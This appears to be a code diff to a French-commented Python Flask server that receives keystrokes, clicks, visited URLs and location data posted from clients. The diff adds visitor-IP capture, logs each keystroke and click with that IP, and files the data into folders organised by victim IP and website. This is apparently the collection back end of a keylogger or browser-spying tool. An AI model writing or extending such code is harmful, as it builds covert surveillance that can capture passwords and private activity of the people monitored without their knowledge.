@@ -1,5 +1,6 @@
 import requests
 from flask import Flask, request, jsonify
+import os
 
 app = Flask(__name__)
 port = 3000
@@ -34,15 +35,26 @@ def receive_url():
 
 @app.route('/key', methods=['POST'])
 def receive_key():
+    if request.headers.get('X-Forwarded-For'):
+        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        visitor_ip = request.remote_addr
+    
     received_data = request.json
-    print('Données reçues key :', received_data)
+    print(f'Données reçues touche {visitor_ip}: {received_data}')
     return 'Données reçues'
 
 # Route pour recevoir les données du client - click
 @app.route('/click', methods=['POST'])
 def receive_click():
+    if request.headers.get('X-Forwarded-For'):
+        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        visitor_ip = request.remote_addr
+    
     received_data = request.json
-    print('Données reçues click :', received_data)
+    print(f'Données reçues click {visitor_ip}: {received_data}')
+    dossier(visitor_ip, received_data)
     return 'Données reçues'
 
 # Route pour recevoir les données de localisation
@@ -58,6 +70,36 @@ def receive_location():
     return 'Données de localisation reçues par le serveur'
 
 
+def dossier(ip, data):
+    print('________________________________________________________')
+    print('ip :', ip, "data :", data)
+    data_ip_dir = f"Data/{ip}"
+    print(data_ip_dir)
+    if not os.path.exists(data_ip_dir):
+        os.makedirs(data_ip_dir)
+        print('dossier créé')
+    else:
+        print('dossier déjà existant')
+
+    url = data['url']
+    print(url)
+
+    url = url.split('//')
+    url = url[1].split('/')
+    url = url[0]
+    print(url)
+
+    data_url_dir = f"Data/{ip}/{url}"
+    print(data_url_dir)
+    if not os.path.exists(data_url_dir):
+        os.makedirs(data_url_dir)
+        print('dossier créé')
+    else:
+        print('dossier déjà existant')
+    
+    print('________________________________________________________')
+
+
 # Démarrer le serveur Flask
 if __name__ == '__main__':
-    app.run(port=port)
+    app.run(host='192.168.0.41', port=port)
